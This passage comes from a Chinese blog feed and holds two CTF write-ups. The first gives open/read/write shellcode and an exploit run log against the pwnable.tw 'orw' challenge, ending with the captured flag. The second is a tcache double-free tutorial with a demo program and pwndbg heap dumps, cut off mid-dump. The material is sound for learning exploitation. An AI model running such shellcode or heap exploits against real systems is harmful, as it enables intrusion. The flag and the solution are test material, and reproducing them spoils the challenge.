class="hljs-type">const</span> <span class="hljs-type">char</span> __user *filename<br>mov eax, <span class="hljs-number">0x5</span>;              ;open函数的系统调用：sys_open<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><br><br><span class="hljs-meta">#read(fd,bss+0x200,0x40)</span><br>mov ebx, eax;              ;<span class="hljs-type">int</span> fd<br>mov ecx, <span class="hljs-number">0x0804A260</span>;       ;<span class="hljs-type">void</span> *buf<br>mov edx, <span class="hljs-number">0x40</span>;             ;<span class="hljs-type">size_t</span> count<br>mov eax, <span class="hljs-number">0x3</span>;              ;read函数的系统调用：sys_read<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><br><span class="hljs-meta">#write(1,bss+0x200,0x40)</span><br>mov ebx, <span class="hljs-number">0x1</span>;              ;<span class="hljs-type">int</span> fd=<span class="hljs-number">1</span> (标准输出<span class="hljs-built_in">stdout</span>)(<span class="hljs-number">0</span> 标准输入，<span class="hljs-number">1</span> 标准输出，<span class="hljs-number">2</span> 标准错误输出)<br>mov ecx, <span class="hljs-number">0x0804A260</span>;       ;<span class="hljs-type">void</span> *buf<br>mov edx, <span class="hljs-number">0x40</span>;             ;<span class="hljs-type">size_t</span> count<br>mov eax, <span class="hljs-number">0x4</span>;              ;read函数的系统调用：sys_read<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  others python orw_exp.py <br>[+] Opening connection to chall.pwnable.tw on port <span class="hljs-number">10001</span>: Done<br>[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2<span class="hljs-number">.7</span>/site-packages/pwnlib/data/includes /dev/<span class="hljs-built_in">stdin</span><br>[DEBUG] Assembling<br>    .section .shellcode,<span class="hljs-string">"awx"</span><br>    .global _start<br>    .global __start<br>    _start:<br>    __start:<br>    .intel_syntax noprefix<br>    xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push <span class="hljs-number">0x00006761</span>;push <span class="hljs-number">0x6c662f77</span>;push <span class="hljs-number">0x726f2f65</span>;push <span class="hljs-number">0x6d6f682f</span>;mov ebx,esp;mov eax,<span class="hljs-number">0x5</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;mov ebx,eax;mov ecx,<span class="hljs-number">0x0804A260</span>;mov edx,<span class="hljs-number">0x40</span>;mov eax,<span class="hljs-number">0x3</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;mov ebx,<span class="hljs-number">0x1</span>;mov ecx,<span class="hljs-number">0x0804A260</span>;mov edx,<span class="hljs-number">0x40</span>;mov eax,<span class="hljs-number">0x4</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br>[DEBUG] /usr/bin/x86_64-linux-gnu-as <span class="hljs-number">-32</span> -o /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step2 /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step1<br>[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step3 /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step4<br>[DEBUG] Received <span class="hljs-number">0x17</span> bytes:<br>    <span class="hljs-string">'Give my your shellcode:'</span><br>[DEBUG] Sent <span class="hljs-number">0x4f</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">31</span> c0 <span class="hljs-number">31</span> db  <span class="hljs-number">31</span> c9 <span class="hljs-number">31</span> d2  <span class="hljs-number">68</span> <span class="hljs-number">61</span> <span class="hljs-number">67</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">68</span> <span class="hljs-number">77</span> <span class="hljs-number">2f</span>  │<span class="hljs-number">1</span>·<span class="hljs-number">1</span>·│<span class="hljs-number">1</span>·<span class="hljs-number">1</span>·│hag·│·hw/│<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">66</span> <span class="hljs-number">6</span>c <span class="hljs-number">68</span> <span class="hljs-number">65</span>  <span class="hljs-number">2f</span> <span class="hljs-number">6f</span> <span class="hljs-number">72</span> <span class="hljs-number">68</span>  <span class="hljs-number">2f</span> <span class="hljs-number">68</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>d  <span class="hljs-number">89</span> e3 b8 <span class="hljs-number">05</span>  │flhe│/orh│/hom│····│<br>    <span class="hljs-number">00000020</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> cd  <span class="hljs-number">80</span> <span class="hljs-number">89</span> c3 b9  <span class="hljs-number">60</span> a2 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  ba <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │····│····│`···│·@··│<br>    <span class="hljs-number">00000030</span>  <span class="hljs-number">00</span> b8 <span class="hljs-number">03</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> cd <span class="hljs-number">80</span>  bb <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> b9 <span class="hljs-number">60</span> a2  │····│····│····│··`·│<br>    <span class="hljs-number">00000040</span>  <span class="hljs-number">04</span> <span class="hljs-number">08</span> ba <span class="hljs-number">40</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> b8  <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  cd <span class="hljs-number">80</span> <span class="hljs-number">0</span>a     │···@│····│····│···│<br>    <span class="hljs-number">0000004f</span><br>[DEBUG] Received <span class="hljs-number">0x40</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">46</span> <span class="hljs-number">4</span>c <span class="hljs-number">41</span> <span class="hljs-number">47</span>  <span class="hljs-number">7b</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span>  <span class="hljs-number">6</span>c <span class="hljs-number">6</span>c <span class="hljs-number">63</span> <span class="hljs-number">30</span>  <span class="hljs-number">64</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e <span class="hljs-number">67</span>  │FLAG│{sh3│llc0│ding│<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">5f</span> <span class="hljs-number">77</span> <span class="hljs-number">31</span> <span class="hljs-number">74</span>  <span class="hljs-number">68</span> <span class="hljs-number">5f</span> <span class="hljs-number">6f</span> <span class="hljs-number">70</span>  <span class="hljs-number">33</span> <span class="hljs-number">6</span>e <span class="hljs-number">5f</span> <span class="hljs-number">72</span>  <span class="hljs-number">33</span> <span class="hljs-number">34</span> <span class="hljs-number">64</span> <span class="hljs-number">5f</span>  │_w1t│h_op│<span class="hljs-number">3</span>n_r│<span class="hljs-number">34</span>d_│<br>    <span class="hljs-number">00000020</span>  <span class="hljs-number">77</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span>  <span class="hljs-number">33</span> <span class="hljs-number">7</span>d <span class="hljs-number">0</span>a <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │writ│<span class="hljs-number">3</span>}··│····│····│<br>    <span class="hljs-number">00000030</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │····│····│····│····│<br>    <span class="hljs-number">00000040</span><br>FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}<br>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<br>[*] Switching to interactive mode<br>[*] Got EOF <span class="hljs-keyword">while</span> reading in interactive<br>$ <br></code></pre></td></tr></tbody></table></figure><h2 id="prctl是否能绕过？"><a href="#prctl是否能绕过？" class="headerlink" title="prctl是否能绕过？"></a>prctl是否能绕过？</h2><p>可以，但是不会</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;strong&gt;初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）&lt;/strong&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;题目来源：&lt;a href=&quot;https://pwnable.tw/challenge/#2%EF%BC%</summary>
      
    
    
    
    <category term="pwn 进阶" scheme="https://kylinxin.github.io/categories/pwn-%E8%BF%9B%E9%98%B6/"/>
    
    
    <category term="orw" scheme="https://kylinxin.github.io/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title>Tcache Attack中的Tcache dup（基础）</title>
    <link href="https://kylinxin.github.io/2023/09/15/Tcache%20Attack%E7%9A%84Tcache%20dup/"/>
    <id>https://kylinxin.github.io/2023/09/15/Tcache%20Attack%E7%9A%84Tcache%20dup/</id>
    <published>2023-09-15T13:58:29.000Z</published>
    <updated>2023-09-14T14:03:05.922Z</updated>
    
    <content type="html"><![CDATA[<h1><strong>Tcache Attack中的Tcache dup（基础）</strong></h1><blockquote><p>参考资料：CTF-wiki：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup</a><br>代码汉化：@yichen：<a href="https://www.yuque.com/hxfqg9/bin/qlry85#g5z3g">https://www.yuque.com/hxfqg9/bin/qlry85#g5z3g</a><br>附件：<br>链接: <a href="https://pan.baidu.com/s/1X6PqMvKMTbeIlrv00FelAA">https://pan.baidu.com/s/1X6PqMvKMTbeIlrv00FelAA</a>  密码: u7pc<br>–来自百度网盘超级会员V3的分享</p></blockquote><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote><p>这里使用libc-2.27.so的源码进行分析</p></blockquote><p>Tcache dup利用的是tcache_put()函数的不严谨：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">#代码第<span class="hljs-number">2923</span><span class="hljs-number">-2933</span>行：<br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there's room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>{<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>}<br></code></pre></td></tr></tbody></table></figure><p>从上面的代码可以看出，在libc-2.27版本中没有对tcache_put函数进行检查，甚至没有对tcache-&gt;counts[tc_idx] 的检查，在大幅度提高性能的同时安全性也下降来许多。<br>因为在这个函数中没有任何的检查，<strong>所以我们可以直接对同一个chunk进行多次free，造成cyclical list。</strong></p><blockquote><p>Tcache dup类似于之前fastbin_attack中的double free，但是后者的检查要更多。</p></blockquote><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>接下来我们使用一个demo来进行说明。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//gcc -g -fno-stack-protector -z execstack -no-pie -z norelro test.c -o test</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>{<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"先申请一块内存\n"</span>);<br>    <span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"申请的内存地址是: %p\n"</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"对这块内存地址 free两次\n"</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"这时候链表是这样的 [ %p, %p ].\n"</span>, a, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"接下来再去 malloc 两次: [ %p, %p ].\n"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Finish!!!\n"</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>编译完成之后，使用pwndbg调试程序，首先对代码的第12行下断点，然后开始调试程序，此时的内存状况如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601000</span><br>Size: <span class="hljs-number">0x251</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601250</span><br>Size: <span class="hljs-number">0x21</span><br><br>Top chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601270</span><br>Size: <span class="hljs-number">0x20d91</span><br><br>pwndbg&gt; x/<span class="hljs-number">100</span>gx <span class="hljs-number">0x601000</span><br><span class="hljs-number">0x601000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000251</span> #tcache_perthread_struct<br>......(省略内容均为空)<br><span class="hljs-number">0x601250</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #chunk1<br><span class="hljs-number">0x601260</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x601270</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020d91</span> #top_chunk<br>......(省略内容均为空)<br><span class="hljs-number">0x601310</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; bin<br>tcachebins<br>empty<br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br>all: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dcfc40</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc50</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc60</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc70</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc80</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc90</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfca0</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000601270</span><span class="hljs-number">0x0000000000000000</span><br>    #指向top_chunk<br><span class="hljs-number">0x7ffff7dcfcb0</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dcfca0</span><span class="hljs-number">0x00007ffff7dcfca0</span><br>pwndbg&gt; <br><br></code></pre></td></tr></tbody></table></figure><p>由于在tcache_put函数中没有对堆块进行检查，接下来我们对malloc出的chunk进行多次free。<br>对代码的第15行下断点，继续调试：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601000</span><br>Size: <span class="hljs-number">0x251</span><br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; x/100gx 0x601000<br>0x601000:0x00000000000000000x0000000000000251 #tcache_perthread_struct<br>0x601010:0x00000000000000020x0000000000000000<br>    <span class="hljs-meta">#count=2</span><br>0x601020:0x00000000000000000x0000000000000000<br>0x601030:0x00000000000000000x0000000000000000<br>0x601040:0x00000000000000000x0000000000000000<br>0x601050:0x00000000006012600x0000000000000000<br>    #指向chunk1_data<br>......<span class="hljs-params">(省略内容均为空)</span><br>0x601250:0x00000000000000000x0000000000000021 #chunk1<br>0x601260:0x00000000006012600x0000000000000000<br>0x601270:0x00000000000000000x0000000000020d91 #top_chunk<br>......<span class="hljs-params">(省略内容均为空)</span><br>0x601310:0x00000000000000000x0000000000000000<br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  2]: 0x601260 ◂— 0x601260<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br>0x7ffff7dcfc40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfca0 &lt;main_arena+96&gt;:0x00000000006012700x0000000000000000<br>    #指向top_chunk<br>0x7ffff7dcfcb0 &lt;main_arena+112&gt;:0x00007ffff7dcfca00x00007ffff7dcfca0<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>从上面的内存中可以看出，对chunk1进行两次free之后，在tcache中形成了cyclical list，也就是说chunk1中的next指针指向其本身的chunk_data。<br>由于接下来有两次malloc，因此先来看第一次malloc之后的内存，对malloc下断点：<br>命令：b malloc<br>继续调试程序，由于对malloc下断点，因此程序会停在malloc的push rbp，也就是说程序并没有进行第一次malloc，因此我们输入c继续运行程序，结果如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  1]: 0x601260 ◂— 0x601260<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: 0x601000<br>Size: 0x251<br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; x/100gx 0x601000<br>0x601000:0x00000000000000000x0000000000000251 #tcache_perthread_struct<br>0x601010:0x00000000000000010x0000000000000000<br>    <span class="hljs-meta">#count=1</span><br>0x601020:0x00000000000000000x0000000000000000<br>0x601030:0x00000000000000000x0000000000000000<br>0x601040:0x00000000000000000x0000000000000000<br>0x601050:0x00000000006012600x0000000000000000<br>......（省略内容均为空）<br>0x601250:0x00000000000000000x0000000000000021 #chunk1<br>0x601260:0x00000000006012600x0000000000000000<br>0x601270:0x00000000000000000x0000000000020d91 #top_chunk<br>......（省略内容均为空）<br>0x601310:0x00000000000000000x0000000000000000<br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  1]: 0x601260 ◂— 0x601260<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br>0x7ffff7dcfc40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfca0 &lt;main_arena+96&gt;:0x00000000006012700x0000000000000000<br>    #指向top_chunk<br>0x7ffff7dcfcb0 &lt;main_arena+112&gt;:0x00007ffff7dcfca00x00007ffff7dcfca0<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>为了防止程序跑飞，接下来对代码的第17行下断点，看一下第二次malloc之后的结果：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 